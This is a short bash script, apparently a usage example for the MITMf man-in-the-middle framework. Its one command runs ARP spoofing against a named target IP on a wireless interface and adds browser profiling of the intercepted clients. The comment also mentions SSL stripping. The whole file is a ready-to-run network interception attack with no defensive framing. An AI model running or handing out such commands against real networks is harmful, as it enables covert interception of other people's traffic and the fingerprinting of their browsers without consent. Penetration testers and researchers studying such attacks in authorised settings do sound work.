#!/bin/bash
# Say in addition to the ssltripping and arp-spoofing we also want to profile all of the clients browsers: 

sudo python mitmf.py --arpspoof --iface wlan0 --routerip 192.168.10.10 --target 192.168.10.5 --browserprofiler
